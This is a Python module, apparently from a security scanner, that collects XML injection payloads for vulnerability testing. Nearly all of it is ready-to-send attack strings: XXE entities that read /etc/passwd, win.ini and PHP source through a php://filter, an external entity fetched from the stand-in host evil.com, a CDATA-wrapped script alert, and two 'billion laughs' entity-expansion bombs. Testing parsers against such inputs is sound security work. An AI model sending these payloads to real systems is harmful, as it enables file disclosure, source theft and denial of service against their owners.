"""
XML Injection payloads
Contains payloads for testing XML injection vulnerabilities
"""

class XMLInjectionPayloads:
    """XML Injection payload collection"""
    
    @staticmethod
    def get_all_payloads():
        """Get all XML injection payloads"""
        return (XMLInjectionPayloads.get_basic_xml_payloads() + 
                XMLInjectionPayloads.get_xxe_payloads() +
                XMLInjectionPayloads.get_xml_bomb_payloads())
    
    @staticmethod
    def get_basic_xml_payloads():
        """Get basic XML injection payloads"""
        return [
            "<?xml version='1.0'?><root><test>DOMINATOR_XML_INJECTION</test></root>",
            "<test>xml_injection_test</test>",
            "<?xml version='1.0'?><user><name>admin</name><role>administrator</role></user>",
            "<![CDATA[<script>alert('XML_INJECTION')</script>]]>",
            "<?xml version='1.0'?><data><item>test</item></data>",
            "<root><admin>true</admin></root>",
            "<?xml version='1.0'?><login><user>admin</user><pass>admin</pass></login>",
            "<injection>XML_PAYLOAD_TEST</injection>",
            "<?xml version='1.0'?><config><debug>true</debug></config>",
            "<data><value>injected_xml_content</value></data>"
        ]
    
    @staticmethod
    def get_xxe_payloads():
        """Get XXE (XML External Entity) payloads"""
        return [
            '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM "file:///etc/passwd">]><root>&test;</root>',
            '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM "file:///windows/win.ini">]><root>&test;</root>',
            '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM "http://evil.com/xxe">]><root>&test;</root>',
            '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY % xxe SYSTEM "file:///etc/passwd"> %xxe;]><root></root>',
            '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY xxe SYSTEM "php://filter/read=convert.base64-encode/resource=index.php">]><root>&xxe;</root>'
        ]
    
    @staticmethod
    def get_xml_bomb_payloads():
        """Get XML bomb payloads (Billion Laughs Attack)"""
        return [
            '''<?xml version="1.0"?>
<!DOCTYPE lolz [
<!ENTITY lol "lol">
<!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
<!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
<!ENTITY lol4 "&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;">
]>
<lolz>&lol4;</lolz>''',
            
            '''<?xml version="1.0"?>
<!DOCTYPE bomb [
<!ENTITY a "1234567890">
<!ENTITY b "&a;&a;&a;&a;&a;&a;&a;&a;">
<!ENTITY c "&b;&b;&b;&b;&b;&b;&b;&b;">
]>
<bomb>&c;</bomb>'''
        ]
